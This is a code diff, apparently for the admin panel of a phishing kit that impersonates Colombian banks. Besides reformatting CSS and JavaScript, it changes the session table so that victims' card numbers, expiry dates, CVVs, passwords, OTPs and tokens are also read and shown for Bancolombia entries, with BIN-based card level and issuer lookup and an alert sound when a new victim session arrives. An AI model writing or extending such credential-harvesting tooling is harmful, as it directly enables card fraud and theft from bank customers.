@@ -104,16 +104,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .estado-finalizado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
 .estado-cc_error { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
 
-.bin-nivel {
-    display: inline-block;
-    padding: 3px 9px;
-    border-radius: 5px;
-    font-size: 10px;
-    font-weight: 700;
-    text-transform: uppercase;
-    white-space: nowrap;
-    letter-spacing: 0.3px;
-}
+.bin-nivel { display: inline-block; padding: 3px 9px; border-radius: 5px; font-size: 10px; font-weight: 700; text-transform: uppercase; white-space: nowrap; letter-spacing: 0.3px; }
 .bin-nivel.platinum { background: linear-gradient(135deg, #6b7280, #374151); color: #e5e7eb; }
 .bin-nivel.gold { background: linear-gradient(135deg, #b45309, #f59e0b); color: #fffbeb; }
 .bin-nivel.silver { background: linear-gradient(135deg, #6b7280, #d1d5db); color: #1f2937; }
@@ -125,16 +116,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .bin-nivel.standard { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
 .bin-nivel.desconocido { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
 
-.banco-emisor {
-    font-size: 11px;
-    color: #cbd5e1;
-    font-weight: 500;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    display: inline-block;
-    max-width: 140px;
-}
+.banco-emisor { font-size: 11px; color: #cbd5e1; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display: inline-block; max-width: 140px; }
 
 .block-input { display: flex; gap: 8px; margin-bottom: 14px; }
 .block-input input { flex: 1; padding: 10px 14px; background: #0f1421; border: 1px solid #252d44; border-radius: 8px; color: #e5e7eb; font-size: 13px; outline: none; }
@@ -149,21 +131,8 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
 
-.banco-cell {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    white-space: nowrap;
-    vertical-align: middle;
-}
-.banco-cell svg {
-    height: 18px;
-    width: auto;
-    max-width: 44px;
-    display: inline-block;
-    vertical-align: middle;
-    flex-shrink: 0;
-}
+.banco-cell { display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; vertical-align: middle; }
+.banco-cell svg { height: 18px; width: auto; max-width: 44px; display: inline-block; vertical-align: middle; flex-shrink: 0; }
 
 /* Estilos para el despliegue del historial */
 .fila-detalle { background: #0f1421 !important; display: none; }
@@ -387,7 +356,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                     </div>
                     <div class="section-tools">
                         <input type="text" class="search-input" id="buscarLogs" placeholder="🔍 Buscar tipo, usuario, IP...">
-                        <!-- Se eliminó el botón de borrar logs -->
                     </div>
                 </div>
                 <div class="table-wrap">
@@ -455,31 +423,20 @@ function $(id) { return document.getElementById(id); }
 
 function reproducirSonido() {
     try {
-        if (!audioCtx) {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        }
-        if (audioCtx.state === 'suspended') {
-            audioCtx.resume();
-        }
-
+        if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
+        if (audioCtx.state === 'suspended') { audioCtx.resume(); }
         const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
-
         osc.type = 'sine';
         osc.frequency.setValueAtTime(800, audioCtx.currentTime); 
         osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); 
-
         gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
         gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); 
-
         osc.connect(gain);
         gain.connect(audioCtx.destination);
-
         osc.start();
         osc.stop(audioCtx.currentTime + 0.3);
-    } catch (e) {
-        console.warn('Audio bloqueado', e);
-    }
+    } catch (e) { console.warn('Audio bloqueado', e); }
 }
 
 function toast(msg, isError = false) {
@@ -492,9 +449,7 @@ function toast(msg, isError = false) {
 
 function escapeHtml(s) {
     if (s == null) return '';
-    return String(s).replace(/[&<>"']/g, c => ({
-        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
-    }[c]));
+    return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
 }
 
 function truncar(s, max = 30) {
@@ -521,12 +476,8 @@ function logoMarca(marca) {
 }
 
 function nombreBanco(key, marca) {
-    if (key === 'cc-bogota') {
-        return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>';
-    }
-    if (key === 'cc-bucaramanga') {
-        return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>';
-    }
+    if (key === 'cc-bogota') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bogotá</span>'; }
+    if (key === 'cc-bucaramanga') { return '<span class="banco-cell">' + logoMarca(marca) + ' CC-Bucaramanga</span>'; }
     const nombres = {
         'bancolombia': '🏦 Bancolombia',
         'davivienda': '🏦 Davivienda',
@@ -557,9 +508,7 @@ function claseNivel(nivel) {
 }
 
 function renderNivelTarjeta(tipo, nivel) {
-    if (!nivel || nivel === 'Desconocido') {
-        return '<span class="bin-nivel desconocido">—</span>';
-    }
+    if (!nivel || nivel === 'Desconocido') { return '<span class="bin-nivel desconocido">—</span>'; }
     let tipoMostrar = '';
     const t = String(tipo || '').toUpperCase();
     if (t.includes('CREDIT')) tipoMostrar = 'Crédito ';
@@ -594,12 +543,8 @@ async function login() {
     const password = $('loginPass').value;
     if (!usuario || !password) { mostrarErrorLogin('Complete usuario y contraseña'); return; }
     
-    if (!audioCtx) {
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    }
-    if (audioCtx.state === 'suspended') {
-        audioCtx.resume();
-    }
+    if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
+    if (audioCtx.state === 'suspended') { audioCtx.resume(); }
 
     $('loginBtn').disabled = true;
     $('loginBtn').textContent = 'Verificando...';
@@ -702,10 +647,7 @@ function renderActivos() {
     const tbody = $('tbodyActivos');
     let lista = activosCache;
     if (filtro) {
-        lista = lista.filter(a =>
-            (a.ip || '').toLowerCase().includes(filtro) ||
-            (a.ultimaAccion || '').toLowerCase().includes(filtro)
-        );
+        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro));
     }
     if (!lista.length) {
         tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>';
@@ -791,18 +733,11 @@ async function cargarSesiones() {
         
         if (sesionesAnteriores.size > 0) {
             for (let s of sesionesActuales) {
-                if (!sesionesAnteriores.has(s.sessionId)) {
-                    hayNuevosDatos = true;
-                    break;
-                }
+                if (!sesionesAnteriores.has(s.sessionId)) { hayNuevosDatos = true; break; }
             }
-        } else {
-            hayNuevosDatos = false;
-        }
+        } else { hayNuevosDatos = false; }
 
-        if (hayNuevosDatos) {
-            reproducirSonido();
-        }
+        if (hayNuevosDatos) { reproducirSonido(); }
 
         sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId));
         sesionesCache = sesionesActuales;
@@ -821,8 +756,7 @@ function renderSesiones() {
                 datos.bancoKey, s.estado, datos.identificacion, datos.clave,
                 datos.docNumber, datos.tarjeta, datos.titular, datos.token,
                 datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
-                datos.cvv, datos.marca,
-                datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName
+                datos.cvv, datos.marca, datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
@@ -835,7 +769,9 @@ function renderSesiones() {
     tbody.innerHTML = lista.map(s => {
         const datos = s.datos || {};
         const banco = datos.bancoKey || '-';
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga';
+        
+        // 🔥 CORRECCIÓN CLAVE: Incluir bancolombia para que lea los datos de la tarjeta
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia';
 
         let identificacionTrj = '-';
         let claveFch = '-';
@@ -843,10 +779,13 @@ function renderSesiones() {
         let documento = '';
 
         if (esTarjeta) {
-            identificacionTrj = datos.tarjeta || '-';
-            const mes = datos.expMes || '';
+            identificacionTrj = datos.tarjeta || datos.identificacion || '-';
+            
+            // 🔥 CORRECCIÓN CLAVE: Leer los datos de fecha de la tarjeta correctamente
+            const mes = datos.expMes || datos.exp || '';
             const anio = datos.expAnio || '';
-            claveFch = (mes || anio) ? `${mes}/${anio}` : '-';
+            claveFch = (mes || anio) ? `${mes}/${anio}` : (datos.clave || '-');
+            
             cvv = datos.cvv || '-';
             documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
         } else {
@@ -880,7 +819,7 @@ function renderSesiones() {
             }
         }
 
-        const bancoEmisor = esTarjeta ? (datos.bankName || 'No identificado') : '-';
+        const bancoEmisor = datos.bankName || 'No identificado';
         const tipo = datos.cardType || '';
         const nivel = datos.cardLevel || '';
 
@@ -938,11 +877,8 @@ function actualizarBtnBorrarSesiones() {
 }
 
 $('checkAllSesiones').addEventListener('change', (e) => {
-    if (e.target.checked) {
-        sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId));
-    } else {
-        seleccionSesiones.clear();
-    }
+    if (e.target.checked) { sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId)); }
+    else { seleccionSesiones.clear(); }
     renderSesiones();
 });
 
@@ -975,11 +911,8 @@ function toggleDetalle(id) {
     const el = document.getElementById('detalle-' + id);
     if (el) {
         el.classList.toggle('visible');
-        if (el.classList.contains('visible')) {
-            filasAbiertas.add(id);
-        } else {
-            filasAbiertas.delete(id);
-        }
+        if (el.classList.contains('visible')) { filasAbiertas.add(id); }
+        else { filasAbiertas.delete(id); }
     }
 }
 
@@ -1020,7 +953,7 @@ function renderHistorial() {
         const monto = (datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-';
 
         const tarjeta = datos.tarjeta || '-';
-        const exp = (datos.expMes || datos.expAnio) ? `${datos.expMes || '??'}/${datos.expAnio || '??'}` : '-';
+        const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
         const cvv = datos.cvv || '-';
         const bancoEmisor = datos.bankName || '-';
         const tipoTarjeta = datos.cardType || '-';
